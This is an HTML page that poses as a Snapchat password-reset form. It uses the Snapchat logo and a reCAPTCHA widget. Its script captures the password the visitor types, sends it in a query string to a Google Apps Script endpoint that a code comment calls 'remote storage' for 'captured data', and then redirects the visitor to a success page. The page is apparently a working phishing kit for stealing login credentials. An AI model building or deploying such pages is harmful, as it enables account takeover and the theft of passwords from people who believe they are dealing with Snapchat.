<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reset Password - Snapchat Password Reset</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
    <style>
        .error-message {
            color: red;
            margin-top: 5px;
            font-size: 14px;
        }
    </style>
    <!-- Google reCAPTCHA -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Reset Your Password</h1>
        <form id="passwordResetForm" action="https://script.google.com/macros/s/AKfycbyV612NdUfswOWKawdoKzHm5AX75T2_OXwJttCneY5nDQqQiBplvzAQgSkm0y3onO_z/exec" method="post">
            <label for="new_password">New Password:</label><br>
            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br><br>
            
            <!-- Google reCAPTCHA -->
            <div class="g-recaptcha" data-sitekey="6LdBV_wpAAAAANgf0pE9nmMCdX2ZoDtUWUEJ33i_"></div>
            <span id="captchaError" class="error-message"></span><br>
            
            <input type="submit" value="Reset Password">
        </form>
    </div>
    
    <script>
        document.getElementById('passwordResetForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            var newPassword = document.getElementById('new_password').value;
            
            // Verify reCAPTCHA
            var recaptchaResponse = grecaptcha.getResponse();
            if (!recaptchaResponse) {
                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
                return;
            }
            
            // Send captured data to remote storage (Google Apps Script endpoint)
            storeNewPassword(newPassword, recaptchaResponse);
        });
        
        function storeNewPassword(newPassword, recaptchaResponse) {
            var url = "https://script.google.com/macros/s/AKfycbyV612NdUfswOWKawdoKzHm5AX75T2_OXwJttCneY5nDQqQiBplvzAQgSkm0y3onO_z/exec"; // Update with your deployed Google Apps Script URL
            
            var data = {
                "new_password": newPassword,
                "recaptchaResponse": recaptchaResponse
            };
            
            var queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
            var finalUrl = url + '?' + queryString;
            
            // Send data using fetch API
            fetch(finalUrl, {
                method: 'POST',
                mode: 'no-cors', // No-cors mode because of cross-origin issues
            })
            .then(response => {
                if (response.ok) {
                    console.log("New password submitted successfully");
                    window.location.href = "success.html"; // Redirect to success page
                } else {
                    console.error("Error submitting new password");
                    // Handle error (optional)
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Handle network error (optional)
            });
        }
    </script>
</body>
</html>
